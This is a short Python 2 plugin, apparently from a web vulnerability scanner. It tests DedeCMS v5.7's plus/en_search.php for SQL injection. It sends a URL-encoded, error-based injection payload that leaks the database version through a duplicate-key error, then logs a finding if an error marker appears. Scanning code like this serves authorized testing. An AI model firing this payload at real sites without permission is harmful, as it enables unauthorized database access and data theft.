#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    list = []
    #print "*"*1000
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"plus/en_search.php?typeArr[1%20or%20@%60%27%60%3D1%20and%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28Select%20%28version%28%29%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%20and%20@%60%27%60%3D0]=11&&kwtype=0&q=1111&searchtype=title")
        res, content = requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        #print content
        if content.find('Error infos:')>=0:
            request = getRequest(expurl)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain']+ob['base_path'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:dedecmsv57ensqlinjection.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:dedecmsv57ensqlinjection.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def 